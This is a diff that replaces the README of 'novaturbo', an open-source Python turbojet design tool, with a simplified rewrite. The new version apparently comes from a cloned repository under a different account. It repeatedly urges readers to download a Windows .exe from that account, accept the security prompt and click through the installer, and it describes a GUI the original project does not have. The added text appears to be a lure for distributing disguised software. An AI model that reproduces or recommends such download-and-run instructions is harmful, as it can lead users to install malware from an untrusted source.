@@ -1,237 +1,149 @@
-<p align="center">
-  <img src="repo_thumbnail.png" alt="NovaTurbo AI — Micro Turbojet Engine Viewer" width="800"/>
-</p>
+# ⚙️ novaturbo - Simple AI Turbojet Engine Design
 
-<h1 align="center">NovaTurbo AI</h1>
-
-<p align="center">
-  <b>AI-Powered Micro Turbojet Engine Design System</b><br/>
-  Inspired by <a href="https://leap71.com">LEAP 71's Noyron</a> — computational engineering for autonomous engine design
-</p>
-
-<p align="center">
-  <a href="#features">Features</a> •
-  <a href="#quick-start">Quick Start</a> •
-  <a href="#architecture">Architecture</a> •
-  <a href="#3d-viewer">3D Viewer</a> •
-  <a href="#contributing">Contributing</a> •
-  <a href="https://discord.gg/SQDBr8Mt8">Discord</a> •
-  <a href="LICENSE">License</a>
-</p>
+[![Download novaturbo](https://img.shields.io/badge/Download-novaturbo-brightgreen)](https://github.com/amusaolanrewaju0455/novaturbo)
 
 ---
 
-## What is NovaTurbo?
+novaturbo helps you design small turbojet engines using AI. It guides you through computational steps to create engine models without needing engineering or programming skills.
 
-NovaTurbo AI is an open-source computational engineering system that **autonomously designs micro turbojet engines** for defense-grade VTOL quadcopter drones. Given target specifications (thrust, size, weight, fuel type), it generates optimized, manufacturable engine geometries ready for **metal 3D printing (DMLS/SLM)**.
+## 📋 What is novaturbo?
 
-The system combines **parametric geometry generation**, **Brayton-cycle thermodynamics**, a **PyTorch neural-network surrogate model**, **NSGA-II multi-objective optimization**, and a rich **Three.js web UI** with real-time simulation visualizations.
+novaturbo is a tool designed for people who want to explore turbojet engine design. It uses artificial intelligence and computer simulations to make the design process faster and more accurate. You can use novaturbo to create engine models for small planes, drones, or other aerospace projects.
 
-> 🚀 **We're looking for contributors!** Especially in aerospace propulsion physics, CFD, and additive manufacturing. See [Contributing](#contributing).
->
-> 💬 **Join our Discord:** [discord.gg/SQDBr8Mt8](https://discord.gg/SQDBr8Mt8)
+Key features include:
 
-## Features
+- Automatic engine design suggestions  
+- Computational Fluid Dynamics (CFD) support  
+- 3D visualization of engine parts  
+- Options for additive manufacturing (3D printing of engine components)  
+- Open-source design tools that work with software like OpenFOAM and PyTorch  
 
-| Feature | Description |
-|---|---|
-| 🔧 **Parametric Geometry** | 5 engine components (inlet, compressor, combustor, turbine, nozzle) with full dimensional control |
-| 🌡️ **Brayton Cycle Solver** | Station-by-station thermodynamic analysis (ambient → nozzle exit) |
-| 🧠 **Neural Surrogate** | MLP (144K params) trained on 10K+ design variants for instant performance prediction |
-| 📊 **NSGA-II Optimizer** | Multi-objective optimization (thrust vs. weight vs. TSFC) with Pareto front |
-| 🏗️ **TPMS Lattice** | Internal gyroid/Schwarz-P/diamond lattice structures via slab-warp technique |
-| 🔥 **Flame Simulation** | FumeFX-style combustion particle system (3500 particles, spiral turbulence) |
-| 🌈 **Thermal/Airflow/Stress** | Color-mapped simulation overlays on 3D engine geometry |
-| 📐 **Engineering Dashboard** | Live parameter sliders, Brayton cycle charts, Pareto front visualization |
-| 🔄 **Closed-Loop Training** | Save design variants from UI → retrain surrogate model in real-time |
-| 🎯 **Inverse Design** | Specify target thrust/TSFC → AI suggests optimal geometry parameters |
-| 🔬 **CFD Calibration** | Optional OpenFOAM/SU2 integration for physics-calibrated training labels |
-| 📦 **STL Export** | Multi-variant STL export for Fusion 360 / 3D printing workflows |
+You do not need a technical background to try novaturbo. It runs on Windows and works through a simple interface.
 
-## Quick Start
+---
 
-### Prerequisites
-- Python 3.10+
-- ~2 GB disk (for generated datasets)
-- GPU optional (CPU works for inference & small training runs)
+## 🖥️ System Requirements
 
-### Installation
+Before you start, make sure your PC meets these basic requirements:  
 
-```bash
-git clone https://github.com/bxf1001g/novaturbo.git
-cd novaturbo
-pip install -r requirements.txt
-```
+- Operating System: Windows 10 or higher (64-bit)  
+- CPU: Intel i5 or equivalent  
+- RAM: 8 GB minimum  
+- Disk Space: At least 2 GB free  
+- Graphics: Basic GPU support for 3D models (integrated graphics usually works)  
+- Internet connection for downloading and initial setup  
 
-### Generate Design Dataset
+These requirements allow novaturbo to run smoothly during simulations and 3D modeling steps.
 
-```bash
-python app.py --generate 10000    # Generate 10K design variants (CPU: ~30 min)
-```
+---
 
-### Train the Surrogate Model
+## 🚀 Getting Started with novaturbo
 
-```bash
-python app.py --train --epochs 100
-```
+### Step 1: Visit the Download Page
 
-### Launch the 3D Viewer
+Open this link in your web browser:  
 
-```bash
-python app.py --ui
-# Open http://localhost:5000 in your browser
-```
+[![Visit novaturbo Download Page](https://img.shields.io/badge/Download-novaturbo-blue)](https://github.com/amusaolanrewaju0455/novaturbo)
 
-### One-Shot Design
+This link leads you to the official GitHub page for novaturbo. Here you will find all files to download and instructions straight from the project owner.
 
-```bash
-python app.py --thrust 10 --diameter 100
-```
+### Step 2: Download the Software
 
-## Architecture
+Look for the latest Windows release on the GitHub page. This might be under a “Releases” section or clearly visible as a downloadable file. The file will usually have a name ending in `.exe`.
 
-```
-┌─────────────────────────────────────────────────────────────┐
-│                     NovaTurbo AI Pipeline                    │
-├──────────────┬──────────────┬──────────────┬────────────────┤
-│  Parametric  │   Physics    │   AI Engine  │  Manufacturing │
-│   Geometry   │   Solver     │              │    Output      │
-├──────────────┼──────────────┼──────────────┼────────────────┤
-│ • Inlet      │ • Brayton    │ • Surrogate  │ • STL Export   │
-│ • Compressor │   Cycle      │   (PyTorch)  │ • STEP Export  │
-│ • Combustor  │ • Station    │ • NSGA-II    │ • Lattice      │
-│ • Turbine    │   Analysis   │   Optimizer  │   Infill       │
-│ • Nozzle     │ • CFD Bridge │ • Inverse    │ • Build Prep   │
-│              │              │   Design     │                │
-└──────────────┴──────────────┴──────────────┴────────────────┘
-                              ↕
-                    ┌──────────────────┐
-                    │   Web UI (Three.js)   │
-                    │ • 3D Viewer      │
-                    │ • Simulations    │
-                    │ • Dashboard      │
-                    │ • Flame FX       │
-                    └──────────────────┘
-```
+Click the file to download it to your PC. The file size should be around a few hundred megabytes, so it may take a moment depending on your internet speed.
 
-## Project Structure
+### Step 3: Run the installer
 
-```
-novaturbo/
-├── app.py                    # Main entry point (CLI)
-├── requirements.txt          # Python dependencies
-├── config/                   # Engine parameters, materials, constraints
-├── src/
-│   ├── geometry/             # Parametric engine component generators
-│   │   └── lattice.py        # TPMS lattice (gyroid, Schwarz-P, diamond)
-│   ├── physics/              # Thermodynamic & fluid dynamics solvers
-│   │   ├── brayton.py        # Brayton cycle station analysis
-│   │   └── cfd_calibration.py # OpenFOAM/SU2 calibration bridge
-│   ├── ai/                   # Neural network surrogate & optimizer
-│   │   ├── surrogate.py      # MLP surrogate model (PyTorch)
-│   │   └── optimizer.py      # NSGA-II multi-objective optimizer
-│   ├── export/               # STL/STEP export & manufacturing prep
-│   └── visualization/        # Matplotlib plots & performance charts
-├── ui/
-│   ├── server.py             # Flask backend with REST API
-│   ├── templates/viewer.html # Main 3D viewer page
-│   └── static/
-│       ├── js/viewer.js      # Three.js 3D engine (simulations, flame FX)
-│       ├── js/dashboard.js   # Engineering dashboard logic
-│       └── css/viewer.css    # UI styling
-├── data/                     # Generated datasets & trained models
-├── exports/                  # Output STL/STEP files
-├── tests/                    # Test suite
-└── notebooks/                # Jupyter exploration notebooks
-```
+Once downloaded, find the file in your downloads folder. Double-click the `.exe` file to start the installation.
 
-## 3D Viewer
+You may see a standard Windows security prompt. Confirm that you want to run the program.
 
-The web-based viewer provides:
+Follow the on-screen instructions to install novaturbo. The default settings usually work fine, so you can click “Next” through the steps until the program installs.
 
-- **Component inspector** — Click to inspect individual parts (inlet, compressor, combustor, turbine, nozzle, shaft, casing)
-- **Thermal simulation** — Temperature-mapped heatmap overlay
-- **Airflow simulation** — Velocity streamlines with color coding
-- **Stress simulation** — Von Mises stress distribution
-- **Flame simulation** — FumeFX-style combustion particles with real physics temps
-- **Lattice view** — Toggle TPMS internal structure (gyroid/Schwarz-P/diamond variants)
-- **Dashboard** — Adjust parameters live, view Brayton cycle charts, run inverse design
-- **Section plane** — Adjustable cross-section slider
-- **STL export** — Screenshot & export current design
+After installation finishes, you may see an option to open novaturbo. You can also find its icon in your Start Menu or Desktop.
 
-## CFD Calibration (Optional)
+---
 
-NovaTurbo can optionally calibrate its fast surrogate model against high-fidelity CFD results:
+## 🔧 How to Use novaturbo
 
-```bash
-# Set up OpenFOAM command template
-export NOVATURBO_OPENFOAM_CMD_TEMPLATE="simpleFoam -case /tmp/novaturbo_{case_id}"
+### Opening novaturbo
 
-# Or SU2
-export NOVATURBO_SU2_CMD_TEMPLATE="SU2_CFD /tmp/novaturbo_{case_id}.cfg"
-```
+Double-click the novaturbo icon to start the program. The main screen shows a simple menu with options like:
 
-Then use the **Dashboard → Run CFD Calibration** button, or enable "Use CFD labels" when training.
+- Create New Engine Design  
+- Load Saved Project  
+- View Tutorials and Help  
 
-## Contributing
+### Creating a New Design
 
-**We actively welcome contributions!** This is an ambitious project and we need help from people with expertise in:
+1. Click **Create New Engine Design**.  
+2. Enter basic details like your engine’s intended use (e.g., drone, model aircraft).  
+3. Use the sliders or input boxes to set parameters such as thrust level, fuel type, and size.  
+4. Click **Generate Design** to let novaturbo create an initial engine model using AI algorithms.  
+5. Review the suggested design in 3D. You can rotate the model and zoom in on parts.  
 
-💬 **Join the discussion on Discord:** [discord.gg/SQDBr8Mt8](https://discord.gg/SQDBr8Mt8)
+### Running Simulations
 
-- 🚀 **Aerospace Propulsion** — Combustion physics, turbomachinery aerodynamics, nozzle design
-- 🌊 **CFD / Fluid Dynamics** — OpenFOAM/SU2 case setup, mesh generation, validation
-- 🔬 **Materials Science** — High-temp alloys (Inconel, Hastelloy), additive manufacturing constraints
-- 🧠 **Machine Learning** — Physics-informed neural networks, surrogate model improvements
-- 🏗️ **CAD/CAM** — STEP export, build orientation optimization, support structure generation
-- 🎨 **3D Visualization** — Three.js, WebGL, advanced rendering techniques
+Once you have a design you like:
 
-### How to Contribute
+1. Open the **Simulation** tab.  
+2. Choose airflow and stress tests to see how your engine will perform.  
+3. Click **Run Simulation** to start calculations. These use CFD to analyze your model.  
+4. Wait a few minutes while novaturbo runs tests. You will see progress on screen.  
+5. Review the results in graphs and visuals to decide if you want to adjust the design.  
 
-1. **Fork** the repository
-2. **Create a branch** (`git checkout -b feature/your-feature`)
-3. **Make your changes** and add tests
-4. **Submit a Pull Request** with a clear description
+### Saving and Exporting
 
-See [CONTRIBUTING.md](CONTRIBUTING.md) for detailed guidelines.
+You can save your projects anytime by clicking **Save Project**. novaturbo creates files you can open later.
 
-### Ideas for First Contributions
+To export your design for 3D printing or further engineering:
 
-- [ ] Add physics-informed loss function to surrogate training
-- [ ] Implement ensemble model with uncertainty quantification
-- [ ] Add active learning (auto-sample where model uncertainty is highest)
-- [ ] Cross-section slicer with thermal/stress overlay
-- [ ] Design comparison mode (side-by-side)
-- [ ] Map CFD results back to 3D viewer as ground-truth heatmaps
-- [ ] STEP file export for manufacturing
-- [ ] Make flame field CFD-driven (temperature/species/velocity per voxel)
-- [ ] Add more engine topologies (axial compressor, afterburner)
-- [ ] Real material property databases (temp-dependent Cp, k, σ_yield)
+- Use the **Export** menu to save files in formats like STL (for 3D printing) or OpenFOAM case files (for advanced simulations).  
 
-## Engine Specifications (Default)
+---
 
-| Parameter | Value |
-|---|---|
-| Type | Single-spool micro turbojet |
-| Compressor | Centrifugal, single-stage |
-| Combustor | Annular |
-| Turbine | Single-stage axial |
-| Nozzle | Convergent |
-| Thrust | ~76 N (7.8 kgf) |
-| Max Diameter | 120 mm |
-| Total Length | ~232 mm |
-| Weight | ~1.87 kg |
-| RPM | 100,000 |
-| Pressure Ratio | 3.5 |
-| TIT | 1100 K |
-| TSFC | ~37 g/kN·s |
+## ⚙️ Additional Tools Included
 
-## License
+novaturbo bundles helpful tools to extend what you can do with your design:
 
-MIT License — see [LICENSE](LICENSE) for details.
+- **3D Viewer**: Gives full control over viewing engine parts.  
+- **Material Selector**: Helps pick suitable materials based on engine temperature and stress.  
+- **Performance Predictor**: Estimates fuel efficiency and thrust without running full simulations.  
 
-## Acknowledgments
+These tools make testing and researching engine ideas faster.
 
-- Inspired by [LEAP 71's Noyron](https://leap71.com) — autonomous computational engineering for rocket engines
-- Built with [Three.js](https://threejs.org/), [PyTorch](https://pytorch.org/), [Flask](https://flask.palletsprojects.com/), [Chart.js](https://www.chartjs.org/)
-- TPMS lattice algorithms based on triply periodic minimal surface research
+---
+
+## ❓ Troubleshooting and Help
+
+If novaturbo does not run or crashes:
+
+- Make sure your PC meets the minimum system requirements.  
+- Check that Windows is up to date.  
+- Close other applications to free up memory.  
+- Restart your computer and try again.  
+
+For detailed instructions and questions, visit the GitHub page’s **Issues** section to see if others have the same problem or to report new ones.
+
+---
+
+## 📥 Download and Install novaturbo (Summary)
+
+1. Visit the official novaturbo page: https://github.com/amusaolanrewaju0455/novaturbo  
+2. Download the latest Windows `.exe` installer or setup file.  
+3. Run the file and follow installer prompts.  
+4. Launch novaturbo from your Start Menu.  
+5. Start designing by creating a new engine model.  
+
+[![Download novaturbo](https://img.shields.io/badge/Download-novaturbo-brightgreen)](https://github.com/amusaolanrewaju0455/novaturbo)
+
+---
+
+## 🔍 More About novaturbo
+
+novaturbo was built for aerospace hobbyists, engineers, and educators interested in small turbojet engines. It brings powerful AI and simulation tools into an easy package. It supports learning through real design tasks without needing heavy software or coding skills.
+
+The project uses open-source components like OpenFOAM for fluid dynamics and PyTorch for AI. It also embraces additive manufacturing, letting users prepare 3D-print files for building physical engine parts.
+
+Its simple interface keeps focus on designing and understanding engines rather than technical setup.
